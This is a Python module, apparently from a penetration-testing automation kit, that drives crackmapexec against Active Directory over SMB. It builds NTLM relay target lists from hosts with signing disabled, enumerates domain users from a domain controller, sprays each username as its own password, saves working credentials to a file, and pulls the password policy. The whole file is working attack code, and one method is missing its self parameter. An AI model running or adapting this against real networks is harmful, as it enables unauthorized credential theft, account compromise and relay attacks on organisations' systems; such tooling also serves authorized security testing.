import sys
import re
import os

sys.path.append('../noob/tools')
from tools.tools import Command

def CallBackValidCred(valid):
    
    with open('output/validcreds.txt', 'a') as f:
        f.write(f'{valid}\n')

class SMB:
    def __init__(self, domain_controllers, username, password):
        self.domain_controllers = domain_controllers
        self.username = username
        self.password = password

    def GetSigningDisabled(subnet:str, subnetmask:str):
        file_name = f'relay-{subnet}.txt'
        subnet_complete = f"{subnet}/{subnetmask}"
        signing_check = Command(f"crackmapexec smb {subnet_complete} --gen-relay-list {file_name}", None, None, "output", "crackmapexec_signingdisabled")
        signing_check.run_command()
        return file_name

    def GetUserList(self):
        getUsers = Command(f"crackmapexec smb {self.domain_controllers[0]} -u {self.username} -p '{self.password}' --users",None, None, "output", "users_unparsed.txt")
        getUsers.run_command()
        with open('output/users_unparsed.txt','r') as f, open('output/users_w_domain.txt','w') as o, open('output/users_wo_domain.txt', 'w') as o2:
            output = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', f.read())
            matches = re.findall(r'(\S+)\\(\S+)', output)

            for match in matches:
                o.write(f'{match[0]}\\{match[1]}\n')
                o2.write(f'{match[1]}\n')

    def SprayUserIsPass(self):
        if not os.path.isfile("output/users_wo_domain.txt"):
            self.GetUserList()
        
        spray = Command(f"crackmapexec smb {self.domain_controllers[0]} -u output/users_wo_domain.txt -p output/users_wo_domain.txt --no-bruteforce --continue-on-success", CallBackValidCred, ['[+]'], 'output', 'spray_user_is_pwd.txt')
        spray.run_command()

    def GetPassPol(self):
        getPol = Command(f"crackmapexec smb {self.domain_controllers[0]} -u {self.username} -p {self.password} --pass-pol", None, None, "output", "passpol.txt")
        getPol.run_command()